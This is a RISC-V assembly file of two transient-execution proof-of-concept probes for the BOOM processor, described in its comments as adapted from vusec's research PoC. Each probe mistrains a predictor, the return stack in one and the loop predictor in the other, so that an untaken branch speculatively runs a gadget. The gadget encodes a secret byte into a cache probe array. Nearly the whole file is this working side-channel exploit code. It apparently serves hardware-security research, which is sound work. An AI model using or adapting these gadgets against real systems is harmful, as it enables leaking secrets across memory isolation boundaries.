  .text
  .align 4
  .globl boom_v5_recursive_ret_probe
  .type boom_v5_recursive_ret_probe, @function
  .globl boom_v5_loop_predictor_probe
  .type boom_v5_loop_predictor_probe, @function

# a0 = secret byte address
# a1 = probe array
#
# This is adapted from vusec's recursive-ret/LoopPredictor PoC. The branch below
# is architecturally not taken; under return-predictor pressure it can be reached
# transiently and encode the secret into the probe array.
boom_v5_recursive_ret_probe:
  addi sp, sp, -32
  sd   ra, 24(sp)
  sd   s0, 16(sp)
  sd   s1, 8(sp)
  sd   s2, 0(sp)

  mv   s0, a0
  mv   s1, a1

  # Warm the secret into D-cache.
  lbu  t0, 0(s0)

  li   a0, 0
  li   a1, V5_RAS_DEPTH
  li   a2, V5_RAS_DEPTH + V5_TRAIN_PASSES
  call boom_v5_func1

  ld   s2, 0(sp)
  ld   s1, 8(sp)
  ld   s0, 16(sp)
  ld   ra, 24(sp)
  addi sp, sp, 32
  ret

  .align 4
boom_v5_func1:
  addi a0, a0, 1
  bge  a0, a1, boom_v5_call_func2
    addi sp, sp, -8
    sd   ra, 0(sp)
    call boom_v5_func1
    ld   ra, 0(sp)
    addi sp, sp, 8
    j    boom_v5_after

boom_v5_call_func2:
    addi sp, sp, -8
    sd   ra, 0(sp)
    call boom_v5_func2
    ld   ra, 0(sp)
    addi sp, sp, 8

boom_v5_after:
  li   t1, 1
  li   t0, 2
  .rept V5_IN_PLACE_DELAY
  mul  t0, t0, t1
  .endr
  beqz t0, boom_v5_speculative_gadget
  ret

  .align 4
boom_v5_func2:
  addi a0, a0, 1
  bge  a0, a2, boom_v5_ret_to_func1
    addi sp, sp, -8
    sd   ra, 0(sp)
    call boom_v5_func2
    ld   ra, 0(sp)
    addi sp, sp, 8
    fence
    ret

boom_v5_ret_to_func1:
  fence
  ret

  .align 4
boom_v5_speculative_gadget:
  lbu  t4, 0(s0)
  slli t4, t4, 6
  add  t4, s1, t4
  lbu  t5, 0(t4)
  ret

  .align 4

# a0 = secret byte address
# a1 = probe array
#
# Loop-predictor variant adapted from vusec's BOOM disclosure PoC. The victim
# creates a bounded ret-driven loop by overwriting ra with the current PC. The
# beqz branch is architecturally not taken; after repeated ret-loop iterations,
# BOOM's loop predictor can transiently send control to the probe encoder.
boom_v5_loop_predictor_probe:
  addi sp, sp, -48
  sd   ra, 40(sp)
  sd   s0, 32(sp)
  sd   s1, 24(sp)
  sd   s2, 16(sp)
  sd   s3, 8(sp)
  sd   s4, 0(sp)

  mv   s0, a0
  mv   s1, a1
  li   s2, V5_RAS_DEPTH
  li   s3, V5_TRAIN_PASSES
  add  s2, s2, s3
  mv   s4, ra

  # Preload the secret line like the reference PoC; only the probe load encodes.
  lbu  t0, 0(s0)
  fence

boom_v5_lp_victim:
  auipc ra, 0

  .align 4
boom_v5_lp_target:
  li   t1, 1
  li   t0, 2
  .rept V5_IN_PLACE_DELAY
  mul  t0, t0, t1
  .endr
  beqz t0, boom_v5_lp_speculative_gadget

  addi s2, s2, -1
  beqz s2, boom_v5_lp_done
  ret

boom_v5_lp_done:
  mv   ra, s4
  ld   s4, 0(sp)
  ld   s3, 8(sp)
  ld   s2, 16(sp)
  ld   s1, 24(sp)
  ld   s0, 32(sp)
  ld   ra, 40(sp)
  addi sp, sp, 48
  ret

  .align 4
boom_v5_lp_speculative_gadget:
  lbu  t4, 0(s0)
  slli t4, t4, 6
  add  t4, s1, t4
  lbu  t5, 0(t4)
  ret
